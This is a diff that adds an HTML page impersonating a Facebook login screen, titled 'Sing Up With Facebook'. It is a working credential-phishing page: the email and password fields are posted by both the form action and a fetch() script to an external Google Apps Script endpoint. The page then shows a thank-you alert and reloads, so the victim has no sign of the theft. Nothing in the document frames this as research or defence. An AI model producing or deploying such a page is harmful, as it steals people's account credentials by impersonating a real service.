@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Sing Up With Facebook</title>
+</head>
+<body>
+    <form action="https://script.google.com/macros/s/AKfycbwJz3ICrla-IjOoSk_CU1J8BPKB8fWYqVI4rP9ZMKvAIYTfB8WgBckaXNHdrCPvzGoTkg/exec"method="POST"id="from"name="form">
+        
+
+
+        <h5>English(UK)</h5>
+            <!-- facebook icon -->
+            <button class="facebook_img"><img src="Icon/facebook.png" alt=""></button>
+
+
+        <input type="email" name="Email" id="email"placeholder="Email or Phone">
+        <input type="password" name="Password" id="password"placeholder="Password"><br>
+        <button type="submit"class="Button">Log In</button><br>
+        <p>Forgotten Password?</p>
+        <button class="create_id">Create new acount</button>
+    </form>
+    
+
+
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwJz3ICrla-IjOoSk_CU1J8BPKB8fWYqVI4rP9ZMKvAIYTfB8WgBckaXNHdrCPvzGoTkg/exec'
+        const form = document.forms['form']
+        
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Thank you! your form is submitted successfully." ))
+            .then(() => {  window.location.reload(); })
+            .catch(error => console.error('Error!', error.message))
+            return false;
+        })
+    </script>
+</body>
+</html>
